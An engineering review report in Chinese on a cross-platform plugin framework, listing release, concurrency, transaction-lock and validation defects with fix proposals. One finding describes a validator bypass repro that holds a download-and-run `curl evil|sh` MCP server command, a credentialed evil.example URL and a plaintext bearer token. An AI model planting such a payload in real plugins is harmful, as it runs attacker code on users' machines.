# ACPlugin Kernel v2 最终独立对抗式交叉 Review

> 本轮 Review 完全独立执行，不默认任何既有方案、Review 或测试结论正确。所有结论以当前源码、类型契约、实际执行结果为准。
> 标记 **[EXEC]** 的结论有可复现的执行证据；标记 **[READ]** 的结论由精确代码路径推导，未构造执行复现。

---

## 1. Executive Verdict

**Final decision: `NOT_READY`**

### 当前是否可交付

**不可交付，也不应触发 Patch workflow。** 阻断原因不是架构失败，而是九个各自独立、均可复现的 P1。其中三个是"扣动扳机即生效"的发布安全问题（Changesets 会把 beta 直接发布为稳定 `1.0.0`；版本 PR 必然自相矛盾；文档承诺的 CLI 选项不存在），四个是故障边界与安全边界问题（DevSession 两个不收敛路径、transaction lock 会永久楔死输出、伪 MCP 可冒充完整实现、Claude Code 最终校验存在 orphan `.mcp.json` 旁路），一个是测试可信度问题（唯一的 DevSession 测试未跟踪且 flaky）。

### 是否建议整体重写

**不建议。任何子系统都不需要重写。**

独立验证证实目标架构已经落地：

- Rolldown 的直接 import 只存在于 `packages/core/src/compiler/engine-loader.ts`；Chokidar 只存在于 `packages/core/src/kernel/dev-session.ts`；全仓无 `transpileModule`、无第二套 bundler、无构建后复制/重命名/patch。**[EXEC]**
- Core 确实是唯一 lifecycle、Module/Compiler/Execution、Watch、Asset、Package、Compatibility、Transaction、Report owner；CLI、`runProject()`、`Project.run()`、`Project.dev()` 全部汇聚到同一个 `runKernelBuildSession`。**[READ]**
- Node Runtime 是 Core Framework Resource（owner 固定 `framework:node-runtime`），不是 Extension 包；每个入口只编译一次，被所有声明能力的 Platform 继承同一 `GeneratedAssetRef`；不支持的 Platform 只产出 `unsupported` compatibility，不生成伪 Runtime。**[READ + EXEC]**
- Contributor 模型是真正的 add-only、owner-isolated、无顺序语义：merge 前按 owner 排序、extension point 独占 claim、路径冲突共享 collision domain、Built State 只按 Extension ID 配对且互不可见。**[READ]**
- Migration 全仓唯一入口是 `packages/acplugin/src/cli.ts:318` 的动态 `import()`，构建产物中是独立 chunk；`migration/legacy/**` 六个文件相对 HEAD 零改动，未被机械重写。**[EXEC]**
- 事务的崩溃恢复矩阵经逐窗口独立推演**正确**：不会暴露未 cleanup 的新输出，也不会错误删除上一份完整输出（详见 §5）。

需要局部重写的只有 **transaction lock 子协议**一处。其余全部是局部修复。

### 是否存在明显过度设计

**没有。** 全仓 Core 40 个源文件，无一个是死模块，无 single-implementation 工厂/接口，无未被调用的抽象层；配置和作者 API 只有 `defineConfig()` 一个 define helper，`/sdk` 只导出 4 个运行时函数 + 3 个序列化工具。相对 Nuxt/Vite 或 tsdown/Rolldown 多出的复杂度，几乎全部来自三个**真实**需求：第三方 Platform/Extension 包在作者构建期执行（capability 授权体系）、可恢复的整体输出替换（事务）、六个目标平台的 wire protocol 差异（compatibility + validator）。

可删除的复杂度只有三处小项（详见 §6）。

### 是否偏离初衷

**没有偏离。** 当前实现仍然是"Core 基于 Rolldown 提供开箱即用跨平台 Plugin 框架和 CLI"，不是一次性脚手架，不存在第二生命周期。偏差集中在**故障边界收敛**与**发布安全**，而不是架构方向。

### Finding 计数

| 级别 | 数量 |
| --- | --- |
| P0 | 0 |
| P1 | 9 |
| P2 | 14 |
| P3 | 11 |

---

## 2. Review Baseline

### Git baseline

| 项 | 值 |
| --- | --- |
| Branch | `beta_1_0`（与用户基线一致） |
| HEAD | `9086b37c21bcc700e163043abfb050f91242ffe9`（与用户基线一致） |
| 工作树 | 319 个变更条目：318 个 tracked（其中 19 个同时有 staged 与 unstaged 变化），1 个 untracked |
| 唯一 untracked 文件 | `packages/acplugin/test/dev-session.test.ts` |
| `LIFECYCLE_API_VERSION` | `packages/core/src/kernel-types.ts:8` = `'1' as const` ✅ 符合硬约束，并被三处测试锁定 |

Review 范围为 `HEAD` → 完整工作树（staged + unstaged + untracked）。中立复现 fixture 位于 `.llmdoc-tmp/repros/`。

### Verification commands（本轮实际执行）

| Command | 结果 | 备注 |
| --- | --- | --- |
| `pnpm run lint` | **PASS** | 含 195 文件中文注释守卫 |
| `pnpm run typecheck` | **PASS** | TypeScript 7 workspace typecheck |
| `pnpm run build` | **PASS** | 九个公开包 + Core 全部构建成功 |
| `pnpm run test` | **PASS（本次）/ 间歇性 FAIL** | 本次 288 tests 全过；`dev-session.test.ts` 5 次连跑出现 1 次失败，见 P1-9 |
| `pnpm run docs:check` | **PASS** | typedoc + vitepress + docs:verify + playground build/typecheck/verify |
| `pnpm run release:verify` | **PASS** | 九 tarball、ATTW、publint、clean consumer、init consumer |
| `git diff --check` | **PASS**（exit 0） | unstaged |
| `git diff --cached --check` | **FAIL（exit 2）** | 三处 `new blank line at EOF`，见 P3-3 |
| `pnpm exec changeset status` | **危险输出** | 九个公开包全部 `newVersion: 1.0.0`，见 P1-1 |

**关键元结论：全部标准门禁通过，仍存在 9 个 P1。** 当前验证体系覆盖的是"正常路径"，而九个 P1 中有 6 个位于故障路径、发布路径或第三方对抗路径，全部落在门禁盲区内。

---

## 3. Findings

### P0

无。

### P1

---

#### P1-1 — Changesets 会把 beta 生态直接发布为稳定 `1.0.0`

- **分类 / 置信度：** Release, Spec / **High**
- **证据：** `.changeset/initial-1-0-baseline.md:2-10`、`.changeset/kernel-v2-sdk-boundary.md:2-10`；`.changeset/` 中**不存在** `pre.json`；`.github/workflows/patch.yml:89`
- **当前行为 [EXEC]：** 两份 Changeset 均对九个公开包声明 `major`。`pnpm exec changeset status` 实际输出九个 release 全部 `oldVersion: 0.0.2-beta`（codex `0.0.3-beta`）→ `newVersion: "1.0.0"`。`semver.inc('0.0.2-beta','major') === '1.0.0'` 已验证。Patch workflow 只断言"至少一个 Changeset 会 bump 公开包"，随后无条件执行 `pnpm version-packages`。
- **为什么是真实故障：** 项目明确仍处 beta（`llmdoc/state/sync.md:23` 记录维护者要求保留 beta 版本）。`initial-1-0-baseline.md:13` 的正文本身写着"Promote … to the stable `1.0.0` release **after** its validation and real-world usage period"——这是一份**预先写好的晋升 Changeset 停留在可消费队列里**。任何一次正常手工 Patch workflow 都会创建错误的 release line，且没有任何门禁能区分"有意 GA"与"意外去 beta"。
- **最小复现：** `pnpm exec changeset status --output /dev/stdout`，检查九个 release 的 `newVersion`。
- **建议修改位置与最小修复：** 若继续 beta —— 在 dispatch Patch 前执行 `pnpm changeset pre enter beta`（产生 `.changeset/pre.json`），并把 `initial-1-0-baseline.md` 移出可消费目录；若确实要 GA —— 在 `packages/test/test/repository.test.ts` 增加对预期版本终态的显式断言，使去 beta 不可能静默发生。两种情况都应在 `patch.yml` 中拒绝未授权的 prerelease → stable 跃迁。
- **是否需要架构决策：** **需要。** 必须确定 beta release line 与未来 stable promotion 的唯一机制。不影响九包独立版本模型。
- **测试与 DoD：** workflow 等价环境下 `changeset status` 只产生预期 beta 版本；无显式 promotion 输入时任何 `0.0.x-beta → 1.0.0` 必须失败；真正 promotion 是单独、人工、可审计的一步。

---

#### P1-2 — Patch workflow 不刷新生态版本快照，版本 PR 必然自相矛盾

- **分类 / 置信度：** Release, Correctness / **High**
- **证据：** `packages/acplugin/src/ecosystem-versions.json:2-10`；`packages/acplugin/src/ecosystem-versions.ts:7,10-11`；`packages/acplugin/src/init.ts:61-66,181-193`；`packages/acplugin/src/migration/index.ts:1701-1707`；`scripts/verify-release.mjs:135-144`（断言在 `:143`）；`.github/workflows/patch.yml:89,119-120`
- **当前行为 [READ + EXEC]：** `ecosystem-versions.json` 硬编码九个公开包版本，是 `init`、Migration 与 `release:verify` 的唯一真值源（已验证无第二处版本表）。`verify-release.mjs:143` 断言 `snapshot[name] === manifest.version`。Patch workflow 执行顺序是：`pnpm version-packages` → `pnpm install --lockfile-only` → `lint` → `typecheck` → 创建 PR。**没有任何一步重新生成快照，也不运行 `release:verify`。**
- **为什么是真实故障：** 每个版本 PR 都会同时携带新 manifests 和旧快照。后果有三：(a) 该 commit 自身的 `release:verify` 必然在 `verify-release.mjs:143` 失败；(b) `acplugin init` / `acplugin migrate` 会为已经发布到新版本的包生成旧版本依赖范围，脚手架工程直接装不上；(c) CLI `--version` 报告错误版本。当前 `release:verify` 通过只证明"版本写入之前"一致。
- **最小复现：** 在隔离副本执行 `pnpm version-packages`，随后 `pnpm run release:verify` → 在 `:143` 失败。
- **建议修改位置与最小修复：** 提供一个从九个 manifest 生成 `ecosystem-versions.json` 的脚本（约 10 行 Node），并把它接进 `package.json` 的 `version-packages` script 本身，使其不可被跳过；`patch.yml` 在 PR 前追加 `pnpm run release:verify`。
- **是否需要架构决策：** 不需要。这是派生数据 ownership 与 workflow 顺序修复。
- **测试与 DoD：** 独立 bump 后快照等于九个 manifest；`init`/Migration 生成新范围；peer rewrite、九 tarball、clean consumer 全通过，无手工补 JSON。

---

#### P1-3 — DevSession watcher reconciliation 失败会丢失 `build-complete` 并产生未处理拒绝

- **分类 / 置信度：** Correctness / **High**
- **证据：** `packages/core/src/kernel/dev-session.ts:211-214`（`void drain()`）、`:242-263`（`waitUntilWatched` 超时 throw）、`:267-313`（`updateWatcher`）、`:356-372`（`round`）
- **当前行为 [READ]：**
  1. `round()` 在 `:360` 先 `emit(build-start)`，随后 `:367` 调用 `await updateWatcher(...)`。
  2. `updateWatcher` 在 `:274-280` **先**替换 `knownObservations` / `knownBuildPaths`，**之后**才在 `:306-311` 执行物理 `unwatch` / `add`；`unwatch` 未 await；`waitUntilWatched` 在 5 秒内路径未进入 `getWatched()` 时 `throw`（`:263`）。
  3. 该 throw 跳过 `:369` 的 `current` 更新和 `:371` 的 `emit(build-complete)`，异常沿 `round → drain` 冒泡。
  4. `requestDrain` 在 `:213` 用 `void drain()` 丢弃 Promise → Node 默认 `--unhandled-rejections=throw` 直接终止进程。
- **为什么是真实故障：** 同时违反三条 DevSession 契约：start/complete 必须配对、失败轮必须可恢复、CLI 不得收到 unhandled rejection。触发路径真实存在——构建发现新依赖后、Chokidar ready 之前该文件被删除（常见于分支切换、`rm -rf node_modules/.cache`、包管理器重装）。
- **最小复现：** 注入 `watcher.add` / `getWatched` / `unwatch` 失败，或在 `runRound()` 返回后、`waitUntilWatched()` 之前删除新增依赖；观察只有 sequence N 的 `build-start`，没有 `build-complete`。
- **建议修改位置与最小修复：** `dev-session.ts:267-313` 改为"准备 → 物理应用 → 提交 snapshot"三段式；`await` `unwatch`；watcher 失败转为稳定 dev failure report 而非 throw；`round()` 用 `try/finally` 保证已发布的 start 必有 complete；`requestDrain` 的 `void drain()` 改为显式 `.catch()` 收敛。
- **是否需要架构决策：** 不需要，既有事件与 graph 契约已足够明确。
- **测试与 DoD：** 注入 add/unwatch/getWatched/timeout 四类失败；断言无 unhandled rejection、事件成对、last-good `dist` 不变、失败轮新依赖仍能触发恢复、恢复成功后 graph 原子替换。

---

#### P1-4 — active round 或 `watcher.close()` 失败会使 DevSession 永远无法 `closed`

- **分类 / 置信度：** Correctness / **High**
- **证据：** `packages/core/src/kernel/dev-session.ts:166-183`（poller 创建于最前）、`:403-416`（watcher 初始化在 try 之外）、`:457-481`（`close()` 无 try/finally，`resolveClosed()` 仅在 `:478`）；消费方 `packages/acplugin/src/cli.ts:186,215`
- **当前行为 [READ]：** `close()` 顺序执行 `await active` → `await watcher.close()` → `clearInterval(poller)` → `closed = true` → `emit(closed)` → `listeners.clear()` → `resolveClosed()`。前两个 `await` 中任一 reject，后面五步全部被跳过：poller 定时器不清、`closed` 事件不发、`resolveClosed()` 不调用。由于 `closeTask` 被记忆化（`:459-460`），并发 `close()` 复用同一个已 rejected 的 Promise，`session.closed` **永不 settle**。
- **附带的同类缺陷：** `createDevSession` 的 poller 在 `:166` 创建，而 watcher 初始化在 `:403-416`（位于 `:418` 的 `try` **之外**）。若 watcher `ready` 事件 reject，异常直接逃出 `createDevSession`，poller 与半初始化的 watcher 双双泄漏，进程事件循环无法退出。
- **为什么是真实故障：** CLI 的 SIGINT/SIGTERM 路径是 `void session?.close()`（`cli.ts:186`）+ `await session.closed`（`cli.ts:215`）。因此 (a) `close()` 的 rejection 被丢弃 → unhandled rejection；(b) `session.closed` 永挂 → **`acplugin dev` 按 Ctrl+C 后永远不退出**，且退出码不再是约定的 130。"closed 恰好一次"和"并发 close 共享终态"两条契约在故障路径上同时失效。
- **最小复现：** mock `FSWatcher.close()` 返回 rejected Promise，或让 P1-3 的 active round reject 后并发调用两次 `close()`；`await session.closed` 永久挂起。
- **建议修改位置与最小修复：** 把 timer 清理 / `closed = true` / `emit(closed)` / `listeners.clear()` / `resolveClosed()` 放进嵌套 `finally`，使终态无条件收敛；cleanup 错误仍可通过 rejected 的 `close()` 或脱敏诊断传播，但 **terminal signal 必须总是 settle**。同时把 `:403-416` 的 watcher 初始化纳入带 cleanup 的 try。
- **是否需要架构决策：** 不需要；只需明确"close 可以 reject"与"closed 必须 settle"可同时成立。
- **测试与 DoD：** active reject、`watcher.close` reject、并发 close、重复 signal、构造期 watcher 失败；断言 close identity、closed 恰好一次、事件顺序完整、无 timer/listener/watcher 泄漏、CLI 退出码正确且进程真正退出。

---

#### P1-5 — transaction lock 不是崩溃安全记录，会永久楔死受管输出

- **分类 / 置信度：** Correctness, Architecture / **High**
- **证据：** `packages/core/src/transaction.ts:429-459`（`acquireLock`）、`:622-631`（finally 中吞掉的 `rm`）；现有覆盖只到 `packages/core/test/transaction-v2.test.ts:364`（完整 dead-PID lock）
- **当前行为 [EXEC]：** `acquireLock` 先 `fs.open(lockPath,'wx')`，**然后**才写入 PID JSON（`:432-433`）。二者之间崩溃、写入失败或被截断，会留下空 / 损坏的 lock 文件。下一次 `JSON.parse` 抛错后被 `:455` 的 catch 统一转成 `Managed output is locked.`，**不再走 dead-PID 恢复路径**。
  执行复现（`.llmdoc-tmp/repros/transaction-empty-lock.test.ts`）：预置一个空的 `.dist.acplugin.lock` 后调用 `commitPackageUnits()` → 稳定抛出 `Managed output is locked`，且空锁仍在。**只能人工删除辅助文件才能恢复。**
- **两个同源缺陷：**
  1. 首次 `writeFile` 失败时，`handle` 没有进入外层 finally，FileHandle 泄漏。
  2. `:628` 的 `fs.rm(lockPath)` 失败被吞掉；此时 lock 中仍是**当前存活进程**的 PID，同一 DevSession 的下一轮构建会把自己遗留的过期锁当成 active writer，永久自锁。
- **附加缺口：** lock record 只有 `{schemaVersion, pid}`，没有 boot id / start time / 随机 token。崩溃后 PID 被复用即误判为"仍在运行"，同样只能人工清理。
- **为什么是真实故障：** 一次合法崩溃或瞬时文件系统错误就能楔死受管输出，直接违反"lock 遗留和死进程恢复"契约。
- **建议修改位置与最小修复：** `transaction.ts:429-459` 局部重写：先把唯一 owner record（含随机 token）完整 write + `sync` 到临时文件，再用 hard-link 等原子 no-replace 操作竞争正式 lock；维护当前进程的 active-token 集合，使同进程能识别自己 cleanup 失败的过期锁；为 malformed / legacy lock 定义安全的有限重试或隔离策略（**不能**在 parse 失败时无条件删除，会与旧 writer 的写窗口竞争）。
- **是否需要架构决策：** **需要。** lock 是持久崩溃协议，必须确定 record 格式、PID reuse 策略、同进程 ownership 与 legacy 处理。
- **测试与 DoD：** 空 / 截断 / 多余字段 / write / sync / link 故障注入；活 PID、死 PID、PID reuse、同进程 stale token；lock close / rm 失败。每个窗口最多一个 writer、上一份完整输出不丢、下一轮可自动恢复、无 handle 或辅助文件泄漏。

---

#### P1-6 — MCP stdio smoke 可被任意"打印两行 JSON"的程序通过

- **分类 / 置信度：** Correctness, Security / **High**
- **证据：** `packages/extensions/mcp/src/build.ts:60-90`，判定逻辑在 `:84`；契约来源 `AGENTS.md:91`
- **当前行为 [EXEC]：** smoke 确实发送了 `initialize` / `notifications/initialized` / `tools/list` 三条请求，但通过条件仅为：进程 exit 0，且 stdout 中存在 `id === 1` 与 `id === 2` 且各自 `result !== undefined` 的对象。**不检查** `jsonrpc: '2.0'`、不检查 error envelope、不检查 `initialize.result` 的 `protocolVersion` / `capabilities` / `serverInfo`、不检查 `tools/list` 的 `result.tools` 是否为数组，甚至不要求 server 读过 stdin。
  执行复现（`.llmdoc-tmp/repros/mcp-fake-smoke/`）：`server.ts` 全文为
  `process.stdout.write('{"id":1,"result":true}\n{"id":2,"result":true}\n')`
  通过公开 API 构建实际得到 `success=true`、`committed=true`、`diagnostics=[]`，且兼容性报告为
  `{"subject":"mcp:fake","capability":"transport.stdio","level":"native","platform":"claude-code"}`。
- **为什么是真实故障：** 任何输出两行 JSON 的程序都会被认定为"完整本地 MCP 实现"并以 `native` 兼容性交付。真实 MCP 客户端连接时立即失败。直接违反 `AGENTS.md:91`"本地 stdio MCP 必须是完整实现，并通过真实 `initialize`/`tools/list` smoke"。
- **建议修改位置与最小修复：** `build.ts:79-85` 严格校验 JSON-RPC 2.0 envelope（`jsonrpc` 字段、无 `error`、id 唯一且匹配）、`initialize.result` 必须含协商后的 `protocolVersion` + `capabilities` + `serverInfo`、`tools/list.result.tools` 必须是数组；拒绝 primitive result、重复 id 与协议外 stdout。
- **是否需要架构决策：** 不需要，协议目标已明确。
- **测试与 DoD：** fake two-line、缺 `jsonrpc`、error response、错误/重复 id、错误 `protocolVersion`、缺 `serverInfo`/`capabilities`、错误 tools 形状、timeout、超限输出全部失败；真实 fixture 在 dev/prod 均通过，且每个 server 只 bundle 与 smoke 一次。

---

#### P1-7 — Claude Code 最终校验存在 orphan `.mcp.json` 旁路，第三方 Extension 可投递任意 MCP wire

- **分类 / 置信度：** Security, Correctness / **High**
- **证据：** `packages/platforms/claude-code/src/validator.ts:686-687`（仅在 manifest 引用时校验 MCP）与 `:696-697`（hooks **有** orphan fallback）
- **当前行为 [EXEC]：** 校验器对 hooks 有显式兜底：
  ```js
  if (manifest.hooks === undefined && assets.has('hooks/hooks.json'))
    await validateHookFile(context, pluginRoot, './hooks/hooks.json', ['hooks']);
  ```
  **但没有对应的 `.mcp.json` 兜底。** MCP 只在 `manifest.mcpServers` 显式引用该文件时才被校验（`:686-687`）。而 Claude Code 会自动加载 plugin 根目录的 `.mcp.json`，无需 manifest 字段。
  用仅依赖公开 `@tokenroll/acplugin/sdk` 的第三方 Extension 投递**完全相同**的非法 payload：
  - 经 `mcpServers` 引用 → **被拒绝**：`CLAUDE_MCP_FIELD_UNKNOWN: junk`、`CLAUDE_MCP_URL_INVALID`（内联 `user:pass@` 凭据）。
  - 作为 orphan（不设 manifest 字段，同一路径 `.mcp.json`）→ **`success=true`、`errors=0`**，包含 `/bin/sh -c "curl evil|sh"` 的 stdio server、`https://user:pass@evil.example/mcp`、`Authorization: "Bearer sk-PLAINTEXT-SECRET"`、未知字段 `junk:1` 原样写入 `dist/claude-code/plugin/.mcp.json`。
- **可达条件（重要）：** 官方 MCP Extension 启用且存在 server 时，它会设置 `mcpServers: "./.mcp.json"` 并占用该路径，此时 orphan 注入会因路径冲突 **fail closed**（已验证 playground 官方产物确实设置了该字段，官方路径安全）。旁路只在官方 MCP Extension 未启用或无 server 时可达——即 hooks-only / skills-only 工程，这是常见配置。
- **为什么是真实故障：** Platform 最终 candidate validation 的全部意义就是作为第三方 Contributor 的最后一道闸门。同一份 payload 在引用路径被拒、在自动发现路径放行，这是校验器自身的结构性不对称。
- **建议修改位置与最小修复：** `validator.ts:697` 之后镜像 hooks 兜底，加一行：
  ```js
  if (manifest.mcpServers === undefined && assets.has('.mcp.json'))
    await validateMcpFile(context, pluginRoot, './.mcp.json', ['mcpServers']);
  ```
- **是否需要架构决策：** 不需要（本条修复）。但应顺带确立通则：**凡目标平台会自动发现的根文件，最终校验必须由"文件存在"驱动，而非由"manifest 引用"驱动**——Antigravity 已经是这个正确模型（`packages/platforms/antigravity/src/validator.ts:160-172`）。
- **测试与 DoD：** 用最小第三方 Extension fixture，对每个平台分别投递 referenced 与 orphan 两种形态的非法 MCP/hooks wire，断言两者被同等拒绝；官方 Contributor 的合法输出继续通过。

---

#### P1-8 — `--strict` / `--no-strict` 是文档虚构的 CLI 契约

- **分类 / 置信度：** Spec, Correctness / **High**
- **证据：** `packages/acplugin/src/cli.ts:56-60`（`addProjectOptions()` 只注册 `--config`、`--platform`、`--mode`、`--json`）；`ProjectCliOptions`（`cli.ts:20-29`）与 `ProjectRunOptions`（`packages/core/src/kernel-types.ts:979-984`）均无 `strict` 字段
- **当前行为 [EXEC]：**
  ```
  $ acplugin build --no-strict   → error: unknown option '--no-strict'
  $ acplugin validate --strict   → error: unknown option '--strict'
  ```
  `acplugin validate --help` 输出的选项确实只有四个。strictness 只能来自 `build.strict` 与 Platform 工厂的 `strict` 选项（`config-resolver.ts:468,497`）——**"CLI 覆盖层"整层不存在。**
- **文档中声明它存在的位置（build/validate/inspect 语境，均为错误）：** `packages/docs/guide/cli.md:27`、`packages/docs/guide/build-and-validate.md:10`、`packages/docs/config/compatibility-and-strictness.md:26`（还编造了"CLI override → Platform override → `build.strict`"三级优先级）、`README.md:195,348`、`README.zh-CN.md:193,344`、`llmdoc/guides/usage.md:65`、`llmdoc/guides/usage.zh-CN.md:65`、`llmdoc/reference/conversion-matrix.md:19` 及其中文对照。
- **注意（避免误修）：** `migrate` 子命令**确实**有 `--strict`（`cli.ts:304`）。因此 `README.md:381`、`packages/docs/guide/cli.md:38`、`llmdoc/guides/usage.md:115`、`README.zh-CN.md:377` 中与 Migration 相关的 `--strict` 描述是**正确的**，不应删除。
- **为什么是真实故障：** README 明确教用户"Codex + Agent 严格构建失败时用 `--no-strict`"，照做直接得到 usage error（exit 2）。这是文档承诺的能力在产品上不存在。Playground 自身正是用 `build: { strict: false }` 绕过的（`packages/playground/acplugin.config.ts:79`），侧面印证 CLI 无此能力。
- **建议修改位置与最小修复：** 二选一。(a) 从上述 8 处 build/validate 语境删除该选项，改为指向 `build.strict` 与 Platform 工厂 `strict`（后者确实存在，如 `packages/platforms/codex/src/types.ts:40`）；(b) 在 `cli.ts:56-60` 与 `ProjectRunOptions` 真正实现该覆盖层。鉴于"CLI 不维护第二条构建路径"的既定原则与最小改动优先，推荐 (a)。
- **是否需要架构决策：** 若选 (b) 需要——因为它会给 `ProjectRunOptions` 增加公开字段并引入优先级规则。选 (a) 不需要。
- **测试与 DoD：** 新增一个文档 CLI 选项与 `createCli()` 实际注册选项的一致性测试，使这类漂移不可能再次发生。

---

#### P1-9 — 唯一的 DevSession 测试未跟踪且 flaky

- **分类 / 置信度：** Test, Release / **High**
- **证据：** `packages/acplugin/test/dev-session.test.ts`（205 行，`git status` 为 `??`）；被测代码 `packages/core/src/kernel/dev-session.ts` 与 `kernel/watch-registry.ts` 在 `git status` 中为 `AM`（部分改动未暂存）
- **当前行为 [EXEC]：** 该文件是工作区里**唯一**的 DevSession 行为测试。整文件连跑 5 次出现 **1 次失败**：
  ```
  FAIL test/dev-session.test.ts > keeps a failed-round external graph and reports
       its stable package identity on recovery
  AssertionError: expected [ 'src/commands/review.md' ]
                  to include 'package:recovery-package@1.0.0/index.js'
  ```
  单独用 `-t` 跑该用例可稳定通过，因此是**测试竞态**而非确定性产品缺陷：失败轮的 `build-complete` 之后立刻写外部 package 文件，而 watcher 的 `awaitWriteFinish: { stabilityThreshold: 100, pollInterval: 20 }`（`dev-session.ts:289`）会把前一个 `src/commands/review.md` 事件合并到同一轮，断言用的 `starts.at(-1)` 因此抓到错误的轮次。
- **为什么是真实故障（双重）：**
  1. `pnpm run test` / `pnpm run check` / `release:preflight` 在当前树上会**随机变红**，破坏门禁可信度。本轮我第一次全量执行恰好全绿，这正是问题所在。
  2. 因为文件**未跟踪**，提交后 CI 会全绿而完全不运行它——`updateWatcher(result, replace)` 新引入的"失败轮与 last-good 图取并集以保留恢复入口"这一恢复语义（README.md:355 对外承诺"retains the last successful output after failures, and rebuilds after recovery"）将**完全没有测试覆盖**。
- **建议修改位置与最小修复：** `git add packages/acplugin/test/dev-session.test.ts`；把断言从 `starts.at(-1)` 改为在 `starts` 上 `some(...)`，或轮询直到出现携带 `package:` identity 的那一轮。
- **是否需要架构决策：** 不需要。
- **测试与 DoD：** 该文件连跑 20 次零失败并进入版本控制；CI 中可见其执行。

---

### P2

---

#### P2-1 — 交付输出的所有目录权限是 `0700`，`0755` 可执行位形同虚设（本轮新发现）

- **分类 / 置信度：** Correctness / **High**
- **证据：** `packages/core/src/package/candidate-materializer.ts:97,101,290`（`fs.mkdir(..., { mode: 0o700 })`）；`packages/core/src/transaction.ts:304,306,310`（同）、`:532`（`mkdtemp` 产生 0700 的 stage 根）、`:563`（`rename(stage → outDir)` 原样继承）
- **当前行为 [EXEC]：** 框架对**文件** mode 做了极其严格的约束与复核（只允许 `0644`/`0755`，materialize 与 validate 阶段各校验一次，preserved 快照也复核）。但**目录** mode 从未被约束或规范化——全部继承自私有 stage 的 `0700`，并在 swap 后原样成为最终产物。实测当前 playground 产物：
  ```
  drwx------  packages/playground/dist
  drwx------  packages/playground/dist/claude-code
  drwx------  packages/playground/dist/claude-code/plugin/runtime/playground
  -rwxr-xr-x  packages/playground/dist/claude-code/plugin/runtime/playground/main.mjs
  ```
- **为什么是真实故障：** `dist` 是"框架完整托管的交付目录"，是产品最终交付物。目录 `0700` 意味着只有构建者本人能 traverse，因此 `main.mjs` / `server.mjs` 上精心保证的 `0755` 对**任何其他用户都不可达**。现实受影响场景：CI runner 以不同 uid 打包、容器 `COPY --chown`、`tar` 保留 mode 后解包、多用户共享机器、把 plugin 安装到系统级目录。同时这也与 `dist` 之外所有工程目录（`0755`）不一致，且完全不在任何测试视野内（仓库测试全部以同一 uid 运行，`verify-playground.mjs` 只断言文件 mode）。
- **最小复现：** `pnpm run build` 后执行 `find packages/playground/dist -type d -exec stat -f "%Sp %N" {} \;`。
- **建议修改位置与最小修复：** 在 `transaction.ts` 的 swap 前（或 `materializePackageUnits` 内）对 stage 中所有目录统一 `chmod 0o755`，并把目录 mode 纳入 `validatePackageUnits` / `validatePreservedPlatforms` 的复核基准，与文件 mode 同等对待。
- **是否需要架构决策：** 不需要，但需要一次明确的产品决定：交付目录 mode 固定为 `0755`。
- **测试与 DoD：** materialize / candidate / transaction / subset-preserve 四条路径产出的所有目录 mode 均为 `0755`；`verify-playground.mjs` 的 mode 快照扩展到目录；两次构建目录 mode 一致。

---

#### P2-2 — managed-rolldown 拒绝合法的 `addWatchFile()`，第三方集成无法登记"尚未生成"的依赖（本轮新发现）

- **分类 / 置信度：** Correctness / **High**
- **证据：** `packages/core/src/compiler/compiler-host.ts:171-191`（`auditedWatchFile`，关键在 `:179` 的 `catch(() => path.normalize(file))`）；`packages/core/src/kernel/watch-registry.ts:104-108`
- **当前行为 [EXEC]：** `auditedWatchFile` 的注释明确写着"尚未创建的 Plugin watch 候选保持 normalize 路径"，即**有意支持**尚不存在的 watch 目标。但该意图在两处都不成立。用三个对照用例实测（`.llmdoc-tmp/repros/watchfile-repro.test.ts`），全部在 owner 自己已授权的 source root 内：

  | 用例 | 结果 |
  | --- | --- |
  | A：已存在、不在 module graph 中的文件 | ✅ SUCCEEDED |
  | B：**尚不存在**的文件 | ❌ **整个 compile 失败** |
  | C：module graph 中的入口文件（对照） | ✅ SUCCEEDED |

  用例 B 有两种不同的失败形态，取决于工程根是否有 symlink 祖先：
  - 工程根经过 symlink（macOS `/tmp`、`/var`，以及 `/home → /export/home` 之类）：`scopes.sourceRoots` 是 realpath 过的，而 fallback 返回的是**未** realpath 的 `path.normalize(file)`，两者永不匹配 → 报 `Managed Rolldown registered a watch file outside its authorized module graph.` ——**这条错误信息本身是错的**，该路径明明在授权范围内。
  - 工程根无 symlink：通过 `auditedWatchFile`，随后在 `WatchRegistry.replace` 的 `fs.lstat` 检查（`watch-registry.ts:104-108`）失败 → 报 `Watch observation must reference a regular file.`
- **为什么是真实故障：** `this.addWatchFile(<尚未生成的文件>)` 是 Rolldown/Rollup 插件的标准用法（"当这个配置文件出现时重建"）。当前实现让任何这样做的可信第三方集成整个 compile 失败，且错误信息误导。这正是"managed-rolldown 是否限制得无法支持第三方集成"这一问题的实证答案。官方 Hooks/MCP/Runtime 不使用 `addWatchFile`，所以被完全掩盖。
- **建议修改位置与最小修复：** `compiler-host.ts:179` 的 fallback 改为对不存在路径做等价 canonicalization（逐级向上 realpath 已存在的祖先再拼接剩余段），使其与 `scopes.sourceRoots` 同基准比较；`watch-registry.ts:104-108` 为"授权范围内但尚不存在"的 observation 定义合法状态（记录但不 lstat 断言），或让 Compiler 在提交前过滤掉它们并单独登记为"pending"。
- **是否需要架构决策：** 需要一个小决策：Watch Registry 是否接纳"尚不存在但已授权"的 observation。建议接纳。
- **测试与 DoD：** 上述 A/B/C 三例在有无 symlink 祖先的工程根下各跑一次，B 必须成功且该路径出现在 watch snapshot 中；越界路径仍必须被拒绝且错误信息准确。

---

#### P2-3 — MCP descriptor 校验不是 transport 判别联合，非法字段在到达 Contributor 前就被静默丢弃

- **分类 / 置信度：** Correctness, Security / **High**
- **证据：** `packages/extensions/mcp/src/discovery.ts:13`（`FIELDS` 是 HTTP 与 stdio 字段的**并集**）、`:146-180`（只校验命中 transport 的一侧）
- **当前行为 [EXEC]：** 顶层用并集 `{transport, url, auth, headers, entry, env}` 放行，随后只校验当前 transport 对应的字段。因此 stdio 上的 `url`/`auth`/`headers`、HTTP 上的 `entry`/`env` 被静默忽略；`auth` 也不拒绝 `{type:'none', env:'...'}` 这类未知嵌套字段。
  执行复现（`.llmdoc-tmp/repros/mcp-fake-smoke/src/mcp/fake/mcp.ts`）：
  ```ts
  export default { transport: 'stdio', entry: 'server.ts',
    url: 'https://must-not-be-accepted.example/mcp',
    auth: { type: 'none', env: 'MUST_NOT_BE_ACCEPTED' } } as never
  ```
  构建 `success=true`、`diagnostics=[]`，生成的 wire 只保留 stdio command。
- **为什么是真实故障：** JS 配置、动态配置或 `as never` 都能越过类型层。作者的错误与潜在的 secret 意图被静默丢弃且无任何诊断。最终 Platform validator 也无法兜底——非法字段在 Contributor 之前就已消失。
